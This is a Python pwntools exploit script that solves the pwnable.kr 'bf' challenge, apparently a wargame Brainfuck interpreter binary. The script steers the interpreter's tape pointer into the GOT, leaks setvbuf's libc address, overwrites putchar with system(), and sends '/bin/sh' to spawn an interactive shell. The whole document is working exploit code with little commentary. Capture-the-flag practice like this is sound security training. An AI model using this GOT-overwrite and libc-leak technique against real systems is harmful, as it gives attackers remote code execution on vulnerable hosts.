from pwn import *

context(log_level="debug")
p = process('./bf')
# p = remote('pwnable.kr',9001)
elf = ELF('bf')
#readelf -s bf_libc.so |grep system
libc_system_addr = 0x0003f250
libc_strlen_addr = 0x0007ded0
p_addr = 0x0804A0A0
# vul_addr = 0x08048671
putchar_got = elf.got['putchar']
# strlen_got = elf.got['strlen']
setvbuf_got = elf.got['setvbuf']

# payload = ''
# payload += '<'*(p_addr-setvbuf_got) # point to setvbuf_got
# payload += '.'+'>'+'.'+'>'+'.'+'>'+'.'+'>'+ '<'*4 #leak setvbuf()
# payload += '<'*(setvbuf_got-strlen_got)#point to strlen_got
# payload += ','+'>'+','+'>'+','+'>'+','+'>' #change strlen() to system
# payload += '>'*(putchar_got-(strlen_got+4))
# payload += ','+'>'+','+'>'+','+'>'+','+'>' #change putchar() to val_addr
# payload +='.'
payload  = ''
payload +=',>'*8+'<'*8
payload += '<'*(p_addr-setvbuf_got) # point to setvbuf_got
payload += '.'+'>'+'.'+'>'+'.'+'>'+'.'+'>'+ '<'*4 #leak setvbuf()
payload += '>'*(putchar_got-setvbuf_got)#point to putchar_got
payload += ','+'>'+','+'>'+','+'>'+','+'>'+'<'*4 #change putchar() to system
payload += '>'*(p_addr-putchar_got)#point to string
payload +='.'
print 'length = '+hex(len(payload))
# gdb.attach(p,'b*0x804865A\nb*0x8048648\nc')
p.recvuntil('ons except [ ]\n')
p.sendline(payload)
p.send('/bin/sh\0')#set string
leak = p.recv(1)+p.recv(1)+p.recv(1)+p.recv(1)
leak_setvbuf = u32(leak)
print 'putchar_got_addr = '+hex(putchar_got)
# print 'strlen_got_addr = '+hex(strlen_got)
print 'leak_setvbuf = '+hex(leak_setvbuf)
# system_addr = leak_strlen - libc_strlen_addr + libc_system_addr
system_addr = leak_setvbuf - (0xf763aca0-0xf7613c30)
print 'system_addr = ' + hex(system_addr) 
p.send(p32(system_addr))
# p.send(p32(vul_addr))

p.interactive()